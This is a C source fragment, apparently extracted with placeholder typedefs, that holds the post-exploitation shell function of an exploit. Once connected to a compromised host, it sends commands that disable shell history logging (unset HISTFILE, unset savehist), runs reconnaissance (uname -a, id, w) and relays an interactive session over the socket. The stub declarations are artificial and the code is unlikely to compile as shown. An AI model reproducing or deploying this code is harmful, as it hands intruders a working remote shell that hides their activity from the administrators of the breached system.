
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef char u_char ;
typedef int fd_set ;
typedef int data ;


 scalar_t__ FD_ISSET (int,int *) ;
 int FD_SET (int,int *) ;
 int FD_ZERO (int *) ;
 int exit (int) ;
 int fflush (int ) ;
 int fprintf (int ,char*,...) ;
 int memset (char*,int ,int) ;
 int perror (char*) ;
 int read (int ,char*,int) ;
 int recv (int,char*,int,int ) ;
 int select (int,int *,int ,int ,int ) ;
 int stderr ;
 int stdout ;
 int strlen (char*) ;
 int write (int,char*,int) ;

void shell(int netfd)
{

    if (netfd == -1) {
        fprintf(stderr, "ERROR: failed to connect\n");
        exit(1);
    }

    fflush(stdout);

    fprintf(stderr,"\n[ CONNECTED ! ]\n\n");
    {
        u_char data[8192] = {0};
        fd_set fdz;


        write(netfd,"unset HISTFILE\n",15);
        write(netfd,"unset savehist\n",15);
        write(netfd,"export TERM=xterm\n",18);
        write(netfd,"export SHELL=sh\n",16);
        write(netfd,"uname -a\n",9);
        write(netfd,"id\n",3);
        write(netfd,"w\n",2);

        for(;;) {
            FD_ZERO(&fdz);
            FD_SET(0,&fdz);
            FD_SET(netfd,&fdz);

            if(select(255,&fdz,0,0,0)==-1){
                perror("select");
                exit(-1);
            }

            memset(data,0,sizeof(data));

            if(FD_ISSET(netfd,&fdz)){
                if(recv(netfd,data,sizeof(data)-1,0)==-1) {
                    fprintf(stderr, "[x] ewps! connection closed by foreign host.\n");
                    return;
                }
                fprintf(stderr,"%s",data);
            }
            if(FD_ISSET(0,&fdz)){
                read(0, data, sizeof(data) - 1);
                write(netfd,data,strlen(data));
            }
        }
    }
}
